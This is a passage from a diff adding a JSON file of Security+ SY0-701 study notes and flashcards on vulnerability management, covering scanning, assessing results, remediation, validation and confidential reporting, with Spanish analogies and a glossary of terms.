+          "**Scan scheduling:** Scans should be automated and scheduled (weekly, monthly, quarterly) so findings are consistently tracked over time without requiring manual initiation.",
+          "**Scan scope:** Define which hosts, IP ranges, or subnets are included. Individual host scans provide more detail; subnet-wide scans provide broader coverage.",
+          "**Plugin/definition updates:** Scanner plugins must be kept current to detect the latest vulnerabilities. Outdated plugins cause false negatives — the scanner cannot detect what it does not know about."
+        ],
+        "raw_content": "* **Definition:** The practice of using automated scanning tools such as Nessus or OpenVAS to systematically search for known vulnerabilities across an organization's systems and networks, generating detailed reports for analyst review.\n\n> *Es como contratar a un equipo de inspectores de bomberos para revisar cada rincón del edificio con una lista de verificación: no improvisan, siguen un proceso estructurado y documentan cada hallazgo.*\n\n**Key scanner concepts:**\n\n- **Credentialed vs. Un-credentialed scans:** Credentialed scans provide the scanner with a valid username and password, granting it administrative access to find more vulnerabilities (including those only visible from inside the system). Un-credentialed scans simulate what an external attacker without credentials would find. A credentialed scan will typically discover more vulnerabilities.\n- **Scan scheduling:** Scans should be automated and scheduled (weekly, monthly, quarterly) so findings are consistently tracked over time without requiring manual initiation.\n- **Scan scope:** Define which hosts, IP ranges, or subnets are included. Individual host scans provide more detail; subnet-wide scans provide broader coverage.\n- **Plugin/definition updates:** Scanner plugins must be kept current to detect the latest vulnerabilities. Outdated plugins cause false negatives — the scanner cannot detect what it does not know about.\n\n**Common scanner tools:**\n\n| Tool | Description |\n| --- | --- |\n| **Nessus (Tenable)** | Industry-standard commercial scanner; Nessus Essentials is free for up to 16 IPs |\n| **OpenVAS / Greenbone** | Open-source vulnerability scanner; community edition available at no cost |\n| **QualysGuard** | Cloud-based enterprise vulnerability management platform |\n\n**Scan output categories (Nessus example):** Critical · High · Medium · Low · Informational. Focus remediation efforts on Critical and High findings first; Informational findings are not typically exploitable.\n\n---"
+      },
+      {
+        "name": "Assessing Vulnerability Scan Results",
+        "definition": "The process of comprehensively analyzing data gathered from vulnerability scans to determine which vulnerabilities require immediate attention and which can be addressed in a structured manner later, confirming true positives and filtering out false positives.",
+        "analogy": "*Es como revisar los resultados de un examen médico completo: no todos los hallazgos son igual de urgentes. El médico los analiza, descarta los falsos positivos y te dice cuáles necesitan atención inmediata.*",
+        "tables": [
+          {
+            "headers": [
+              "Format",
+              "Best for"
+            ],
+            "rows": [
+              [
+                "**By host**",
+                "Seeing all vulnerabilities on a single machine"
+              ],
+              [
+                "**By plugin/vulnerability**",
+                "Seeing all machines affected by a specific vulnerability"
+              ],
+              [
+                "**Executive summary**",
+                "Non-technical stakeholders needing high-level posture overview"
+              ],
+              [
+                "**CSV export**",
+                "Data analysis or import into SIEM tools"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "**Confirm true positives:** Validate that the scanner finding corresponds to a real vulnerability on the actual system.",
+          "**Identify false positives:** Remove findings that do not apply (e.g., a Windows patch flag on a Linux server).",
+          "**Filter by severity:** Prioritize Critical and High findings for immediate remediation.",
+          "**Cross-reference CVEs:** Use the CVE database to get detailed context on each finding.",
+          "**Filter by host or CVE:** Modern scanners support filtering results by specific IP addresses or CVE identifiers, enabling targeted analysis of a specific machine or a specific known vulnerability across the entire network.",
+          "**Use CVSS scores with context:** A 10.0 score on an isolated internal-only server may be lower priority than a 6.5 score on a public-facing web server."
+        ],
+        "raw_content": "* **Definition:** The process of comprehensively analyzing data gathered from vulnerability scans to determine which vulnerabilities require immediate attention and which can be addressed in a structured manner later, confirming true positives and filtering out false positives.\n\n> *Es como revisar los resultados de un examen médico completo: no todos los hallazgos son igual de urgentes. El médico los analiza, descarta los falsos positivos y te dice cuáles necesitan atención inmediata.*\n\nWhen assessing scan results, the analyst must:\n\n- **Confirm true positives:** Validate that the scanner finding corresponds to a real vulnerability on the actual system.\n- **Identify false positives:** Remove findings that do not apply (e.g., a Windows patch flag on a Linux server).\n- **Filter by severity:** Prioritize Critical and High findings for immediate remediation.\n- **Cross-reference CVEs:** Use the CVE database to get detailed context on each finding.\n- **Filter by host or CVE:** Modern scanners support filtering results by specific IP addresses or CVE identifiers, enabling targeted analysis of a specific machine or a specific known vulnerability across the entire network.\n- **Use CVSS scores with context:** A 10.0 score on an isolated internal-only server may be lower priority than a 6.5 score on a public-facing web server.\n\n**Reporting output formats from scanners:**\n\n| Format | Best for |\n| --- | --- |\n| **By host** | Seeing all vulnerabilities on a single machine |\n| **By plugin/vulnerability** | Seeing all machines affected by a specific vulnerability |\n| **Executive summary** | Non-technical stakeholders needing high-level posture overview |\n| **CSV export** | Data analysis or import into SIEM tools |\n\n---"
+      },
+      {
+        "name": "Vulnerability Response and Remediation",
+        "definition": "The strategies and actions taken to identify, assess, and address vulnerabilities in a system or network to mitigate associated risks and strengthen the organization's security posture.",
+        "analogy": "*Es como tener un plan de emergencias con múltiples opciones dependiendo del tipo de incendio: extintores para pequeños, rociadores para grandes, evacuación para situaciones extremas. No hay una sola respuesta para todo.*",
+        "tables": [
+          {
+            "headers": [
+              "Type",
+              "Duration",
+              "Example"
+            ],
+            "rows": [
+              [
+                "**Exception**",
+                "Temporary",
+                "Legacy server cannot be patched without breaking a critical app; exception granted with an expiration date"
+              ],
+              [
+                "**Exemption**",
+                "Permanent",
+                "Research supercomputer physically isolated from the network; permanently exempt from update policy because it cannot run modern security software"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** The strategies and actions taken to identify, assess, and address vulnerabilities in a system or network to mitigate associated risks and strengthen the organization's security posture.\n\n> *Es como tener un plan de emergencias con múltiples opciones dependiendo del tipo de incendio: extintores para pequeños, rociadores para grandes, evacuación para situaciones extremas. No hay una sola respuesta para todo.*\n\nThere are five main response and remediation options:\n\n### Vulnerability Response and Remediation: Patching\n\n* **Definition:** The process of applying updates provided by software vendors to fix known security vulnerabilities or improve performance in software, systems, or applications.\n\nPatches are the **primary and most direct** remediation method. When a vendor releases a security patch, it is the end user organization's responsibility to apply it across all affected systems. Patches should be tested in a controlled environment before broad enterprise deployment to avoid introducing new issues.\n\n### Vulnerability Response and Remediation: Insurance Policies\n\n* **Definition:** A cybersecurity risk insurance policy that an organization procures to mitigate financial losses resulting from a cyber incident such as a data breach, network outage, or business interruption.\n\nCybersecurity insurance does not fix the vulnerability — it is a **risk transfer strategy**. It covers costs such as legal fees, new hardware, consultants, public relations recovery efforts, and customer breach notification costs. Insurance is used when the cost of full remediation exceeds the acceptable risk threshold.\n\n### Vulnerability Response and Remediation: Network Segmentation\n\n* **Definition:** Dividing a computer network into smaller, isolated segments to limit the lateral movement of a threat, ensuring that a compromise in one segment does not propagate into others.\n\nExample: A hospital separates patient data systems from non-critical administrative systems. If malware infects the administrative segment, the segmented patient data network remains protected.\n\n### Vulnerability Response and Remediation: Compensating Controls\n\n* **Definition:** Alternative security measures implemented when a primary or standard security control cannot feasibly be applied to a given system, designed to provide an equivalent level of protection.\n\nExample: An organization mandates MFA on all systems, but some legacy servers cannot support MFA software. Until those servers are upgraded, compensating controls are implemented — such as rigorous password policies, account lockout after failed login attempts, and regular security awareness training — to reduce the risk in the interim.\n\n### Vulnerability Response and Remediation: Exceptions and Exemptions\n\n* **Definition:** Formal acknowledgments that a security control or policy will be temporarily (exception) or permanently (exemption) relaxed for a specific system or use case, with documented rationale, scope, and risk acceptance.\n\n| Type | Duration | Example |\n| --- | --- | --- |\n| **Exception** | Temporary | Legacy server cannot be patched without breaking a critical app; exception granted with an expiration date |\n| **Exemption** | Permanent | Research supercomputer physically isolated from the network; permanently exempt from update policy because it cannot run modern security software |\n\n⚠️ **Exam Tip:** Both exceptions and exemptions require documented rationale and acceptance of the associated risk. Neither eliminates the risk — they acknowledge and manage it.\n\n---"
+      },
+      {
+        "name": "Validating Vulnerability Remediation",
+        "definition": "The process of confirming through rescanning, auditing, and verification that remediation actions have effectively mitigated identified vulnerabilities and that the system is now secure and still operationally functional.",
+        "analogy": "*Es como pedir una segunda opinión médica después de un tratamiento: no das por sentado que funcionó solo porque el doctor dijo que sí. Te hacen otro examen para confirmar que el problema desapareció.*",
+        "tables": [],
+        "list_items": [
+          "**Scheduled automatically** to ensure consistent validation across all systems.",
+          "**Comprehensive** — scan the full system, not just the single patched vulnerability, to assess overall posture.",
+          "**Conducted under the same conditions** as the original scan to enable an accurate apples-to-apples comparison.",
+          "**Configuration auditing:** Checks the system setup for misconfigurations or deviations from the security baseline.",
+          "**Patch auditing:** Confirms that all patches were properly applied and that all known vulnerabilities have been addressed.",
+          "**Compliance checks:** Ensures the system remains compliant with applicable regulations (GDPR, HIPAA, GLBA, SOX) after changes were made.",
+          "Automated auditing tools (such as configuration management solutions) significantly accelerate this process.",
+          "**Targeted penetration test:** Simulates the specific attack vector to confirm it can no longer be exploited.",
+          "**User verification:** Confirms all applications and services continue to function correctly after the changes — remediation should not break what was working.",
+          "**Feedback loops:** Mechanisms for users and staff to quickly report any post-remediation issues.",
+          "**External auditor:** Provides a purely objective, third-party evaluation of remediation effectiveness — particularly valuable for regulatory compliance."
+        ],
+        "raw_content": "* **Definition:** The process of confirming through rescanning, auditing, and verification that remediation actions have effectively mitigated identified vulnerabilities and that the system is now secure and still operationally functional.\n\n> *Es como pedir una segunda opinión médica después de un tratamiento: no das por sentado que funcionó solo porque el doctor dijo que sí. Te hacen otro examen para confirmar que el problema desapareció.*\n\n### Validating Vulnerability Remediation: Rescanning\n\n* **Definition:** Conducting a new vulnerability scan after remediation to confirm the vulnerability is no longer present, verify the patch was correctly installed, and identify any newly introduced vulnerabilities.\n\nRescanning should be:\n\n- **Scheduled automatically** to ensure consistent validation across all systems.\n- **Comprehensive** — scan the full system, not just the single patched vulnerability, to assess overall posture.\n- **Conducted under the same conditions** as the original scan to enable an accurate apples-to-apples comparison.\n\n⚠️ A patch can sometimes **fix the target vulnerability but introduce new ones** — only a comprehensive rescan will catch this.\n\n### Validating Vulnerability Remediation: Auditing\n\n* **Definition:** The systematic review of logs, configurations, and patch status to ensure they align with established security standards and policies, validating that remediation actions were properly implemented.\n\n- **Configuration auditing:** Checks the system setup for misconfigurations or deviations from the security baseline.\n- **Patch auditing:** Confirms that all patches were properly applied and that all known vulnerabilities have been addressed.\n- **Compliance checks:** Ensures the system remains compliant with applicable regulations (GDPR, HIPAA, GLBA, SOX) after changes were made.\n- Automated auditing tools (such as configuration management solutions) significantly accelerate this process.\n\n### Validating Vulnerability Remediation: Verification\n\n* **Definition:** The final checkpoint in the remediation validation process, involving testing the system to confirm that patches and configuration changes had the desired effect without disrupting normal operations.\n\nVerification methods:\n\n- **Targeted penetration test:** Simulates the specific attack vector to confirm it can no longer be exploited.\n- **User verification:** Confirms all applications and services continue to function correctly after the changes — remediation should not break what was working.\n- **Feedback loops:** Mechanisms for users and staff to quickly report any post-remediation issues.\n- **External auditor:** Provides a purely objective, third-party evaluation of remediation effectiveness — particularly valuable for regulatory compliance.\n\n---"
+      },
+      {
+        "name": "Vulnerability Reporting",
+        "definition": "The process of documenting and communicating details about security weaknesses identified in systems or software to the individuals or organizations responsible for addressing them, ensuring vulnerabilities are managed discreetly and effectively to prevent exploitation.",
+        "analogy": "*Es como el informe médico que el doctor le da al especialista: contiene información detallada y sensible que debe mantenerse en canales seguros y solo llegar a quienes realmente la necesitan.*",
+        "tables": [],
+        "list_items": [
+          "**Horizontal reporting:** Cybersecurity analyst → system administrators (operational detail, patch instructions).",
+          "**Vertical reporting:** Analyst/security team → management/executives (security posture overview, prioritized summary).",
+          "**Vendor coordination:** Engaging the vendor of the vulnerable product gives them the opportunity to develop a patch not just for your organization, but for all customers using that product.",
+          "**CVE database contributions:** Sharing non-sensitive vulnerability details with the CVE database or vendor knowledge bases increases the broader security community's knowledge.",
+          "The method used to discover and reproduce the vulnerability.",
+          "The potential impact if the vulnerability is exploited.",
+          "Proposed mitigations that customers can apply until a patch is released.",
+          "**Encrypt all reports** before distribution or storage.",
+          "**Use secure storage** (password-protected internal SharePoint or document repository) rather than emailing PDFs directly.",
+          "**Access control:** Share with those who have a legitimate need-to-know only:",
+          "System administrators → full technical report (they need it to patch).",
+          "Executives → 3–5 page executive summary with graphs and high-level posture overview (not the 300-page detailed technical report).",
+          "Accountants, HR, etc. → no access required.",
+          "**Exploitation** — attackers use it to attack known vulnerabilities before they are patched.",
+          "**Reputational damage** — public loss of confidence in the organization's ability to protect data.",
+          "**Legal repercussions** — liability under contracts, industry regulations, or customer lawsuits if their data is exposed."
+        ],
+        "raw_content": "* **Definition:** The process of documenting and communicating details about security weaknesses identified in systems or software to the individuals or organizations responsible for addressing them, ensuring vulnerabilities are managed discreetly and effectively to prevent exploitation.\n\n> *Es como el informe médico que el doctor le da al especialista: contiene información detallada y sensible que debe mantenerse en canales seguros y solo llegar a quienes realmente la necesitan.*\n\nVulnerability reports must use **clear, concise, and transparent language** while simultaneously maintaining **strict confidentiality** — a leaked vulnerability report is essentially a roadmap for attackers, detailing every weakness in the organization's defenses.\n\n### Vulnerability Reporting: Internal Reporting\n\n* **Definition:** The identification, documentation, and communication of vulnerability findings within the organizational structure, either horizontally to system administrators who apply patches or vertically to management and executives who oversee security posture.\n\n- **Horizontal reporting:** Cybersecurity analyst → system administrators (operational detail, patch instructions).\n- **Vertical reporting:** Analyst/security team → management/executives (security posture overview, prioritized summary).\n\nInternal reports must be **timely** — rapid reporting reduces the window of exposure between discovery and remediation. Established communication paths and protocols ensure reports reach the right people without delay.\n\n### Vulnerability Reporting: External Reporting\n\n* **Definition:** Communication of vulnerability information outside the organization's structure, typically involving vendors, partners, customers, or the public at large.\n\nCommon external reporting scenarios:\n\n- **Vendor coordination:** Engaging the vendor of the vulnerable product gives them the opportunity to develop a patch not just for your organization, but for all customers using that product.\n- **CVE database contributions:** Sharing non-sensitive vulnerability details with the CVE database or vendor knowledge bases increases the broader security community's knowledge.\n\nExternal reporting must protect the privacy of employees, customers, and vendors. Sensitive system details should not be disclosed in ways that could put others at risk.\n\n### Vulnerability Reporting: Responsible Disclosure Reporting\n\n* **Definition:** The ethical practice of disclosing a discovered vulnerability to the responsible vendor with enough detail to reproduce and fix it, before making any public announcement, to prevent threat actors from exploiting users during the remediation window.\n\nA responsible disclosure report to a vendor should include:\n\n- The method used to discover and reproduce the vulnerability.\n- The potential impact if the vulnerability is exploited.\n- Proposed mitigations that customers can apply until a patch is released.\n\nExample: A vulnerability affecting SMBv1 and SMBv2 — proposed mitigation is to disable those protocol versions or block Port 445 at the firewall — protecting customers externally until Microsoft releases an official patch through Windows Update.\n\n### Vulnerability Reporting: Confidentiality in Vulnerability Reports\n\n* **Definition:** The requirement that vulnerability reports be encrypted, access-controlled, and shared only on a need-to-know basis to prevent the detailed list of organizational weaknesses from being used by threat actors to plan and execute attacks.\n\nA vulnerability report is a comprehensive map of an organization's weaknesses — in the wrong hands, it tells an attacker exactly where to target. Confidentiality is non-negotiable.\n\n**Best practices for report confidentiality:**\n\n- **Encrypt all reports** before distribution or storage.\n- **Use secure storage** (password-protected internal SharePoint or document repository) rather than emailing PDFs directly.\n- **Access control:** Share with those who have a legitimate need-to-know only:\n  - System administrators → full technical report (they need it to patch).\n  - Executives → 3–5 page executive summary with graphs and high-level posture overview (not the 300-page detailed technical report).\n  - Accountants, HR, etc. → no access required.\n\n**Consequences of a leaked vulnerability report:**\n\n- **Exploitation** — attackers use it to attack known vulnerabilities before they are patched.\n- **Reputational damage** — public loss of confidence in the organization's ability to protect data.\n- **Legal repercussions** — liability under contracts, industry regulations, or customer lawsuits if their data is exposed.\n\n---"
+      },
+      {
+        "name": "Key Terms Glossary",
+        "definition": "Vulnerability Management: Systematic lifecycle process of identifying, evaluating, prioritizing, and mitigating vulnerabilities",
+        "analogy": "",
+        "tables": [
+          {
+            "headers": [
+              "Term",
+              "Definition"
+            ],
+            "rows": [
+              [
+                "**Vulnerability Management**",
+                "Systematic lifecycle process of identifying, evaluating, prioritizing, and mitigating vulnerabilities"
+              ],
+              [
+                "**Vulnerability Scanning**",
+                "Automated probing of systems against a database of known vulnerabilities"
+              ],
+              [
+                "**Static Analysis (SAST)**",
+                "Review of application source code before execution to find vulnerabilities"
+              ],
+              [
+                "**Dynamic Analysis (DAST)**",
+                "Evaluation of a running application to find runtime vulnerabilities"
+              ],
+              [
+                "**Package Monitoring**",
+                "Continuous scanning of third-party dependencies for known vulnerabilities"
+              ],
+              [
+                "**Penetration Testing**",
+                "Simulated real-world attack to identify exploitable weaknesses"
+              ],
+              [
+                "**Threat Intelligence**",
+                "Evidence-based knowledge about existing or emerging threats used to guide defense"
+              ],
+              [
+                "**Threat Intelligence Feed**",
+                "Continuous stream of threat data including IoCs, malicious IPs, malware signatures"
+              ],
+              [
+                "**OSINT**",
+                "Open-Source Intelligence — threat data collected from publicly available sources"
+              ],
+              [
+                "**ISAC**",
+                "Information Sharing and Analysis Center — industry sector alliance for threat intelligence sharing"
+              ],
+              [
+                "**Dark Web**",
+                "Hidden, non-indexed portion of the Internet; monitored by researchers for emerging threat intelligence"
+              ],
+              [
+                "**Responsible Disclosure**",
+                "Ethical practice of privately notifying a vendor of a vulnerability before public announcement"
+              ],
+              [
+                "**Bug Bounty Program**",
+                "Formal program offering monetary rewards to researchers who find and report validated vulnerabilities"
+              ],
+              [
+                "**True Positive**",
+                "Scanner correctly identifies a real vulnerability that exists on the system"
+              ],
+              [
+                "**False Positive**",
+                "Scanner incorrectly flags a vulnerability that does not exist"
+              ],
+              [
+                "**True Negative**",
+                "Scanner correctly identifies no vulnerability where none exists"
+              ],
+              [
+                "**False Negative**",
+                "Scanner fails to detect a real vulnerability that exists — most dangerous outcome"
+              ],
+              [
+                "**CVSS**",
+                "Common Vulnerability Scoring System — standardized 0–10 numeric severity scoring framework"
+              ],
+              [
+                "**CVE**",
+                "Common Vulnerabilities and Exposures — database of known vulnerabilities with unique identifiers at cve.mitre.org"
+              ],
+              [
+                "**Exposure Factor (EF)**",
+                "Percentage of an asset likely to be damaged if a specific vulnerability is exploited"
+              ],
+              [
+                "**Risk Tolerance**",
+                "Level of risk an organization is willing to accept before remediation action is required"
+              ],
+              [
+                "**Patching**",
+                "Applying vendor-released updates to fix known security vulnerabilities"
+              ],
+              [
+                "**Cybersecurity Insurance**",
+                "Risk transfer strategy covering financial losses from cyber incidents"
+              ],
+              [
+                "**Segmentation**",
+                "Dividing a network into isolated segments to limit lateral movement of threats"
+              ],
+              [
+                "**Compensating Controls**",
+                "Alternative security measures applied when a standard control cannot be implemented"
+              ],
+              [
+                "**Exception**",
+                "Temporary relaxation of a security control with documented rationale and expiration"
+              ],
+              [
+                "**Exemption**",
+                "Permanent waiver of a security control for a specific system with documented justification"
+              ],
+              [
+                "**Rescanning**",
+                "Post-remediation vulnerability scan to confirm the vulnerability has been addressed"
+              ],
+              [
+                "**Configuration Auditing**",
+                "Review of system setup to detect misconfigurations or security baseline deviations"
+              ],
+              [
+                "**Patch Auditing**",
+                "Confirmation that patches were properly applied and known vulnerabilities addressed"
+              ],
+              [
+                "**Vulnerability Reporting**",
+                "Documenting and communicating vulnerability findings to responsible stakeholders"
+              ],
+              [
+                "**Internal Reporting**",
+                "Sharing vulnerability findings within the organization (horizontal to admins or vertical to management)"
+              ],
+              [
+                "**External Reporting**",
+                "Communicating vulnerability details to vendors, partners, customers, or the public"
+              ],
+              [
+                "**Nessus**",
+                "Commercial vulnerability scanner by Tenable; free Essentials version available for up to 16 IPs"
+              ],
+              [
+                "**OpenVAS**",
+                "Open-source vulnerability scanner; community edition by Greenbone"
+              ],
+              [
+                "**Credentialed Scan**",
+                "Vulnerability scan performed with valid system credentials — finds more internal vulnerabilities"
+              ],
+              [
+                "**Un-credentialed Scan**",
+                "Vulnerability scan without credentials — simulates an external attacker's view"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "| Term | Definition |\n| --- | --- |\n| **Vulnerability Management** | Systematic lifecycle process of identifying, evaluating, prioritizing, and mitigating vulnerabilities |\n| **Vulnerability Scanning** | Automated probing of systems against a database of known vulnerabilities |\n| **Static Analysis (SAST)** | Review of application source code before execution to find vulnerabilities |\n| **Dynamic Analysis (DAST)** | Evaluation of a running application to find runtime vulnerabilities |\n| **Package Monitoring** | Continuous scanning of third-party dependencies for known vulnerabilities |\n| **Penetration Testing** | Simulated real-world attack to identify exploitable weaknesses |\n| **Threat Intelligence** | Evidence-based knowledge about existing or emerging threats used to guide defense |\n| **Threat Intelligence Feed** | Continuous stream of threat data including IoCs, malicious IPs, malware signatures |\n| **OSINT** | Open-Source Intelligence — threat data collected from publicly available sources |\n| **ISAC** | Information Sharing and Analysis Center — industry sector alliance for threat intelligence sharing |\n| **Dark Web** | Hidden, non-indexed portion of the Internet; monitored by researchers for emerging threat intelligence |\n| **Responsible Disclosure** | Ethical practice of privately notifying a vendor of a vulnerability before public announcement |\n| **Bug Bounty Program** | Formal program offering monetary rewards to researchers who find and report validated vulnerabilities |\n| **True Positive** | Scanner correctly identifies a real vulnerability that exists on the system |\n| **False Positive** | Scanner incorrectly flags a vulnerability that does not exist |\n| **True Negative** | Scanner correctly identifies no vulnerability where none exists |\n| **False Negative** | Scanner fails to detect a real vulnerability that exists — most dangerous outcome |\n| **CVSS** | Common Vulnerability Scoring System — standardized 0–10 numeric severity scoring framework |\n| **CVE** | Common Vulnerabilities and Exposures — database of known vulnerabilities with unique identifiers at cve.mitre.org |\n| **Exposure Factor (EF)** | Percentage of an asset likely to be damaged if a specific vulnerability is exploited |\n| **Risk Tolerance** | Level of risk an organization is willing to accept before remediation action is required |\n| **Patching** | Applying vendor-released updates to fix known security vulnerabilities |\n| **Cybersecurity Insurance** | Risk transfer strategy covering financial losses from cyber incidents |\n| **Segmentation** | Dividing a network into isolated segments to limit lateral movement of threats |\n| **Compensating Controls** | Alternative security measures applied when a standard control cannot be implemented |\n| **Exception** | Temporary relaxation of a security control with documented rationale and expiration |\n| **Exemption** | Permanent waiver of a security control for a specific system with documented justification |\n| **Rescanning** | Post-remediation vulnerability scan to confirm the vulnerability has been addressed |\n| **Configuration Auditing** | Review of system setup to detect misconfigurations or security baseline deviations |\n| **Patch Auditing** | Confirmation that patches were properly applied and known vulnerabilities addressed |\n| **Vulnerability Reporting** | Documenting and communicating vulnerability findings to responsible stakeholders |\n| **Internal Reporting** | Sharing vulnerability findings within the organization (horizontal to admins or vertical to management) |\n| **External Reporting** | Communicating vulnerability details to vendors, partners, customers, or the public |\n| **Nessus** | Commercial vulnerability scanner by Tenable; free Essentials version available for up to 16 IPs |\n| **OpenVAS** | Open-source vulnerability scanner; community edition by Greenbone |\n| **Credentialed Scan** | Vulnerability scan performed with valid system credentials — finds more internal vulnerabilities |\n| **Un-credentialed Scan** | Vulnerability scan without credentials — simulates an external attacker's view |"
+      }
+    ],
+    "flashcards": [
+      {
+        "name": "Vulnerability Management",
+        "definition": "A systematic and ongoing process of identifying, evaluating, prioritizing, and mitigating vulnerabilities in computer systems, networks, and software applications to maintain a secure and resilient cybersecurity posture.",
+        "analogy": "*Es como el mantenimiento preventivo de un edificio: no esperas a que el techo se caiga para revisarlo. Inspeccionas regularmente, identificas grietas, las clasificas por urgencia y las reparas antes de que causen un desastre mayor.*",
+        "raw_content": "* **Definition:** A systematic and ongoing process of identifying, evaluating, prioritizing, and mitigating vulnerabilities in computer systems, networks, and software applications to maintain a secure and resilient cybersecurity posture.\n\nVulnerability management is not a one-time event — it is a continuous lifecycle that includes **vulnerability scanning**, **assessment**, **remediation**, and **monitoring** to minimize the potential for security breaches and ensure the effective management of risk across the entire organization.\n\n> *Es como el mantenimiento preventivo de un edificio: no esperas a que el techo se caiga para revisarlo. Inspeccionas regularmente, identificas grietas, las clasificas por urgencia y las reparas antes de que causen un desastre mayor.*\n\nThe full process is structured around these phases:\n\n1. **Identify** — find weaknesses in systems, applications, and networks.\n2. **Analyze** — evaluate severity, likelihood of exploitation, and organizational impact.\n3. **Remediate** — apply patches, reconfigurations, or compensating controls.\n4. **Validate** — confirm remediation was effective through rescanning and auditing.\n5. **Report** — communicate findings and status to stakeholders.\n\nThis section maps entirely to **Objective 4.3** of the SY0-701 exam.\n\n---"
+      },
+      {
+        "name": "Identifying Vulnerabilities",
+        "definition": "The systematic practice of spotting and categorizing weaknesses in a system, network, or application that could potentially be exploited by a threat actor.",
+        "analogy": "*Es como contratar a un equipo de inspectores antes de comprar un edificio: revisan la estructura, la plomería, el sistema eléctrico y los cimientos para encontrar todos los problemas antes de que alguien los explote.*",
+        "raw_content": "* **Definition:** The systematic practice of spotting and categorizing weaknesses in a system, network, or application that could potentially be exploited by a threat actor.\n\nIdentifying vulnerabilities is the first critical step in building a robust security posture. Without knowing what is broken, you cannot fix it. There are four primary methods used to identify vulnerabilities.\n\n> *Es como contratar a un equipo de inspectores antes de comprar un edificio: revisan la estructura, la plomería, el sistema eléctrico y los cimientos para encontrar todos los problemas antes de que alguien los explote.*"
+      },
+      {
+        "name": "Identifying Vulnerabilities: Vulnerability Scanning",
+        "definition": "An automated method of probing networks, systems, and applications to discover known vulnerabilities by comparing the system's current state against a database of documented weaknesses.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An automated method of probing networks, systems, and applications to discover known vulnerabilities by comparing the system's current state against a database of documented weaknesses.\n\nTools such as **Nessus** and **OpenVAS** perform vulnerability scans and generate detailed reports listing every detected vulnerability along with its criticality level. The cybersecurity professional's responsibility is then to **prioritize**, **patch**, and **mitigate** those vulnerabilities before a threat actor exploits them."
+      },
+      {
+        "name": "Identifying Vulnerabilities: Application Security",
+        "definition": "A set of techniques used to ensure that custom software developed by an organization is free of vulnerabilities within its codebase across the software development lifecycle.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A set of techniques used to ensure that custom software developed by an organization is free of vulnerabilities within its codebase across the software development lifecycle.\n\nThree methods are used under application security:\n\n- **Static Analysis (SAST):** Reviews source code without executing it, either through manual code review (reading each line) or automated tools that scan compiled binaries for insecure coding practices.\n- **Dynamic Analysis (DAST):** Evaluates an application while it is actively running to identify runtime vulnerabilities. Tools such as **OWASP ZAP**, **Burp Suite**, and **Peach Fuzzer** emulate attacks in real time against a live application.\n- **Package Monitoring:** Ensures that the third-party libraries and components an application depends on are secure and up to date. Tools such as **Snyk** and **Dependabot** continuously scan dependencies and alert developers to known vulnerabilities in those packages before they can be exploited."
+      },
+      {
+        "name": "Identifying Vulnerabilities: Penetration Testing",
+        "definition": "A method that simulates real-world attacks on a system to evaluate its security posture and identify exploitable weaknesses that automated tools may not detect.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A method that simulates real-world attacks on a system to evaluate its security posture and identify exploitable weaknesses that automated tools may not detect.\n\nThe pen test report reveals how testers were able to infiltrate or exploit the systems. The cybersecurity analyst's role is to mitigate the issues identified in that report so that the same attack vectors cannot be used again in the future."
+      },
+      {
+        "name": "Identifying Vulnerabilities: System and Process Audits",
+        "definition": "A comprehensive review of an organization's information systems, security policies, and procedures to ensure adherence to security best practices and relevant industry standards.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A comprehensive review of an organization's information systems, security policies, and procedures to ensure adherence to security best practices and relevant industry standards."
+      },
+      {
+        "name": "Identifying Vulnerabilities: The Four-Step Process",
+        "definition": "A structured workflow for identifying and mitigating vulnerabilities consisting of planning, testing, implementation, and auditing.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A structured workflow for identifying and mitigating vulnerabilities consisting of planning, testing, implementation, and auditing.\n\n| Step | Name | Description |\n| --- | --- | --- |\n| 1 | **Planning** | Define policies, procedures, and mechanisms to track and evaluate vulnerabilities; determine how to test and deploy fixes. |\n| 2 | **Testing** | Evaluate patches and updates in a controlled environment before broad deployment to ensure fixes do not introduce new issues. |\n| 3 | **Implementation** | Deploy patches across all necessary devices and applications across the enterprise network. |\n| 4 | **Auditing** | Verify that patches and configuration changes have been effectively implemented and confirm no new issues have emerged. |\n\n---"
+      },
+      {
+        "name": "Threat Intelligence Feeds",
+        "definition": "A continuous stream of data related to potential or current threats that an organization's security might be facing, collected and disseminated by security researchers, organizations, or automated tools to provide real-time or near-real-time updates on emerging threats.",
+        "analogy": "*Es como un servicio de noticias de seguridad en tiempo real: en lugar de esperar a que te ataquen para enterarte del peligro, recibes alertas sobre nuevas amenazas mientras los investigadores las descubren en el mundo real.*",
+        "raw_content": "* **Definition:** A continuous stream of data related to potential or current threats that an organization's security might be facing, collected and disseminated by security researchers, organizations, or automated tools to provide real-time or near-real-time updates on emerging threats.\n\nThreat intelligence data includes new malware signatures, **indicators of compromise (IoCs)**, malicious IP addresses, URLs, and much more. The threat landscape evolves constantly — as defenses improve, threat actors pivot to new targets (from server-side to client-side to mobile to cloud attacks). Staying current requires consuming intelligence from multiple sources.\n\n> *Es como un servicio de noticias de seguridad en tiempo real: en lugar de esperar a que te ataquen para enterarte del peligro, recibes alertas sobre nuevas amenazas mientras los investigadores las descubren en el mundo real.*"
+      },
+      {
+        "name": "Threat Intelligence Feeds: Open-Source Intelligence (OSINT)",
+        "definition": "Intelligence collected from publicly available sources including reports, forums, news articles, blogs, and social media posts, typically available at no cost to the organization.",
+        "analogy": "",
+        "raw_content": "* **Definition:** Intelligence collected from publicly available sources including reports, forums, news articles, blogs, and social media posts, typically available at no cost to the organization.\n\nPopular OSINT feeds include **AlienVault Open Threat Exchange**, the **SANS Internet Storm Center**, and security research blogs and forums. OSINT provides insights into emerging threats without requiring investment in proprietary solutions."
+      },
+      {
+        "name": "Threat Intelligence Feeds: Proprietary or Third-Party Feeds",
+        "definition": "Threat intelligence feeds provided by commercial vendors under a subscription model, offering more refined, analyzed, and timely information than open-source alternatives.",
+        "analogy": "",
